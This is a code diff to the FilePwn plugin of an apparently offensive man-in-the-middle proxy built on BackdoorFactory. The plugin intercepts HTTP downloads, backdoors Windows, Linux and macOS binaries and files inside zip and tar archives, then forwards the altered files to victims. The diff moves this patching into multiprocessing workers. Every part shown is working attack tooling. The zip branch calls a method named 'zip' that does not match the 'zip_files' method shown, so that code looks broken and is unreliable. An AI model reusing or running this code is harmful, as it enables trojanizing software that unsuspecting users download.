@@ -1,3 +1,23 @@
+#!/usr/bin/env python2.7
+
+# Copyright (c) 2014-2016 Marcello Salvati
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 3 of the
+# License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+# General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+# USA
+#
+
 """
     BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'
 
@@ -45,6 +65,8 @@ import shutil
 import random
 import string
 import tarfile
+import multiprocessing
+
 from libs.bdfactory import pebin
 from libs.bdfactory import elfbin
 from libs.bdfactory import machobin
@@ -64,6 +86,8 @@ class FilePwn(Plugin):
     def initialize(self, options):
         '''Called if plugin is enabled, passed the options namespace'''
         self.options = options
+
+        self.patched = multiprocessing.Queue()
 
         #FOR FUTURE USE
         self.binaryMimeTypes = ["application/octet-stream", 'application/x-msdownload', 'application/x-msdos-program', 'binary/octet-stream']
@@ -262,7 +286,8 @@ class FilePwn(Plugin):
                                                    )
                     result = targetFile.run_this()
           
-            return result
+            self.patched.put(result)
+            return
 
         except Exception as e:
             print 'Exception', str(e)
@@ -277,7 +302,8 @@ class FilePwn(Plugin):
         if len(aTarFileBytes) > int(self.userConfig['TAR']['maxSize']):
             print "[!] TarFile over allowed size"
             logging.info("TarFIle maxSize met %s", len(aTarFileBytes))
-            return aTarFileBytes
+            self.patched.put(aTarFileBytes)
+            return
 
         with tempfile.NamedTemporaryFile() as tarFileStorage:
             tarFileStorage.write(aTarFileBytes)
@@ -285,7 +311,8 @@ class FilePwn(Plugin):
 
             if not tarfile.is_tarfile(tarFileStorage.name):
                 print '[!] Not a tar file'
-                return aTarFileBytes
+                self.patched.put(aTarFileBytes)
+                return
 
             compressionMode = ':'
             if formatt == 'gz':
@@ -302,7 +329,8 @@ class FilePwn(Plugin):
 
             if tarFile is None:
                 print '[!] Not a tar file'
-                return aTarFileBytes
+                self.patched.put(aTarFileBytes)
+                return
 
             print '[*] Tar file contents and info:'
             print '[*] Compression:', formatt
@@ -388,9 +416,11 @@ class FilePwn(Plugin):
             if wasPatched is False:
                 # If nothing was changed return the original
                 print "[*] No files were patched forwarding original file"
-                return aTarFileBytes
+                self.patched.put(aTarFileBytes)
+                return
             else:
-                return ret
+                self.patched.put(ret)
+                return
 
     def zip_files(self, aZipFile):
         "When called will unpack and edit a Zip File and return a zip file"
@@ -400,7 +430,8 @@ class FilePwn(Plugin):
         if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
             print "[!] ZipFile over allowed size"
             logging.info("ZipFIle maxSize met %s", len(aZipFile))
-            return aZipFile
+            self.patched.put(aZipFile)
+            return
 
         tmpRan = ''.join(random.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for _ in range(8))
         tmpDir = '/tmp/' + tmpRan
@@ -500,9 +531,11 @@ class FilePwn(Plugin):
 
         if wasPatched is False:
             print "[*] No files were patched forwarding original file"
-            return aZipFile
+            self.patched.put(aZipFile)
+            return
         else:
-            return tempZipFile
+            self.patched.put(tempZipFile)
+            return
 
     def handleResponse(self, request, data):
 
@@ -513,7 +546,13 @@ class FilePwn(Plugin):
             
             if self.bytes_have_format(data, 'zip'):
                 logging.info("%s Detected supported zip file type!" % client_ip)
-                bd_zip = self.zip_files(data)
+                
+                process = multiprocessing.Process(name='zip', target=self.zip, args=(data,))
+                process.daemon = True
+                process.start()
+                process.join()
+                bd_zip = self.patched.get()
+
                 if bd_zip:
                     logging.info("%s Patching complete, forwarding to client" % client_ip)
                     return {'request': request, 'data': bd_zip}
@@ -522,7 +561,13 @@ class FilePwn(Plugin):
                 for tartype in ['gz','bz','tar']:
                     if self.bytes_have_format(data, tartype):
                         logging.info("%s Detected supported tar file type!" % client_ip)
-                        bd_tar = self.tar_files(data)
+                        
+                        process = multiprocessing.Process(name='tar_files', target=self.tar_files, args=(data,))
+                        process.daemon = True
+                        process.start()
+                        process.join()
+                        bd_tar = self.patched.get()
+
                         if bd_tar:
                             logging.info("%s Patching complete, forwarding to client" % client_ip)
                             return {'request': request, 'data': bd_tar}
@@ -535,9 +580,13 @@ class FilePwn(Plugin):
                     fd, tmpFile = mkstemp()
                     with open(tmpFile, 'w') as f:
                         f.write(data)
-            
-                    patchb = self.binaryGrinder(tmpFile)
-                    
+
+                    process = multiprocessing.Process(name='binaryGrinder', target=self.binaryGrinder, args=(tmpFile,))
+                    process.daemon = True
+                    process.start()
+                    process.join()
+                    patchb = self.patched.get()
+
                     if patchb:
                         bd_binary = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                         os.remove('./backdoored/' + os.path.basename(tmpFile))
